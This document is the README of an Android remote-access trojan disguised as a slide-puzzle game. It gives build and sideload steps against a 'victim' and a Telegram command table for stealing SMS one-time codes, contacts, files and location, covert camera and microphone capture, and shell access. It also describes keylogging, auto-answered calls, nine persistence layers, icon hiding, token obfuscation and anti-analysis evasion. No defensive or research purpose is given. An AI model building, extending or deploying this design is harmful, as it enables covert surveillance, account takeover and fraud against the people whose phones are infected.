# ARCHON_X_DEADLOCK_SECURITY — Android RAT (Puzzle Game Disguise)

## Build
1. Open in Android Studio (Giraffe+), Gradle sync.
2. Build → Generate Signed Bundle / APK → release.
3. Sideload APK on target device.

## First Launch Flow
1. Victim opens "Gem Puzzle Quest" — plays slide puzzle normally.
2. C2 service starts silently in `:c2` process.
3. First-beacon + deviceinfo card sent to admin chat.
4. Permission wizard requests runtime perms via game pretext popup.
5. Special-access screens (battery, overlay, accessibility, notification listener, device admin) guided.
6. Once critical perms granted → launcher icon auto-hides → admin confirmation.
7. Long-polling C2 loop active — sub-500ms latency.

## Telegram Bot
- Token and chat ID are baked in (XOR-split in `TokenVault.java`).
- Only admin chat ID `8337256557` can issue commands — all others ignored.
- Bot messages go ONLY to admin.

## Core Commands (admin only)
| Command | Action |
|---|---|
| `/ping` | pong |
| `/session` | device SID |
| `/status` | battery / network / uptime |
| `/deviceinfo` | full hardware card |
| `/sms [n]` | last n SMS, OTPs auto-marked 🔑 |
| `/otp` | OTP log (SMS + notifications) |
| `/contacts [n]` | contacts dump |
| `/location` | GPS + Google Maps link |
| `/frontcam` `/backcam` `/photo` | silent camera capture |
| `/mic [sec]` | mic recording (wake lock held) |
| `/files [path]` | directory listing |
| `/download <path>` | file → bot (≤48MB) |
| `/upload` | reply to file → saved to device |
| `/shell <cmd>` | `/system/bin/sh` execution |
| `/hide` `/unhide` | toggle launcher icon |
| `/health` | 29-point diagnostic |
| `/beacon <sec>` | set polling interval |
| `/kill` | self-destruct |

## Persistence (9 layers)
1. Foreground service (START_STICKY, disguised as "Game Sync")
2. Boot receiver — 8 triggers
3. AlarmManager watchdog — 5-min
4. Separate `:wd` watchdog process
5. Accessibility service ("Game Controls")
6. Notification listener ("Score Alerts")
7. Device Admin ("Anti-Theft Protection")
8. Self-heal service — 60s loop (auto re-hides icon if exposed)
9. JobScheduler revive — 5-min backup

## Auto Behaviors
- New SMS → forwarded + OTP mark + instant relay
- New notification → logged; OTP detected → instant relay
- SIM change → alert
- Admin disabled → alert
- Boot → C2 restart + FGS
- Screen unlock → flag
- Watched app open → capture + alert
- Incoming call → auto-answer (accessibility click)

## Stealth
- Token split into 3 XOR-encoded segments, reconstructed at runtime.
- C2 in separate `:c2` process — game never stutters.
- Anti-analysis: if Frida/Xposed/debugger/emulator detected, C2 goes dormant, game plays normally.
- Icon hide via `PackageManager.setComponentEnabledSetting` on LAUNCHER alias.
- Self-heal re-hides icon if user re-enables it.

## Project Structure
```
app/src/main/
├── AndroidManifest.xml
├── java/com/gempuzzle/quest/
│   ├── MainActivity.java          # puzzle game (front)
│   └── c2/
│       ├── C2Service.java         # foreground service + poll loop
│       ├── TelegramClient.java    # Bot API (long-poll, sendMessage, sendDocument)
│       ├── TokenVault.java        # XOR-split token + chat ID
│       ├── CommandDispatcher.java # command routing
│       ├── DeviceInfo.java        # hardware / status collection
│       ├── HealthCheck.java       # 29-point diagnostic
│       ├── PermissionsWizard.java # post-install escalation
│       ├── IconHider.java         # launcher icon toggle
│       ├── AccessibilityMonitor.java  # keylog / app-open / call-answer
│       ├── NotificationMonitor.java   # notification log + OTP relay
│       ├── DeviceAdminReceiver.java   # lock / reset / wipe
│       ├── BootReceiver.java      # 8-trigger restart
│       ├── WatchdogService.java   # :wd process, 5-min revive
│       ├── SelfHealService.java   # 60s loop, auto re-hide
│       ├── KeystoreBuffer.java    # in-memory keylog
│       ├── NotificationBuffer.java
│       ├── AppOpenWatcher.java
│       ├── CallAutoAnswer.java
│       └── modules/
│           ├── SmsModule.java     # SMS read + OTP extract
│           ├── SmsReceiver.java   # live SMS forward + OTP relay
│           ├── ContactsModule.java
│           ├── LocationModule.java
│           ├── CameraModule.java  # Camera2 silent capture, auto-lens-switch
│           ├── MicModule.java     # MediaRecorder + wake lock
│           ├── FileModule.java    # list / download / upload / zip
│           └── ShellModule.java   # /system/bin/sh
└── res/
    ├── layout/activity_main.xml   # puzzle game UI
    ├── drawable/ic_gem.xml        # app icon
    ├── xml/accessibility_config.xml
    └── xml/device_admin.xml
```

## Notes
- Release build uses ProGuard/R8 (minify + shrink).
- Target SDK 34, min SDK 24 (Android 7.0+).
- Camera2 capture requires foreground service with `camera` type (declared).
- For `/video`, `/burst`, `/gallery`, `/overlay`, `/encrypt`, `/bt_scan`, `/callrec`, `/screenshot`, `/wa`, `/tg`, `/browser_history`, `/clipboard`, `/fake_call`, `/ransom_chat`, `/schedule` — stubs not included; extend `CommandDispatcher.dispatch()` and add modules under `c2/modules/`.
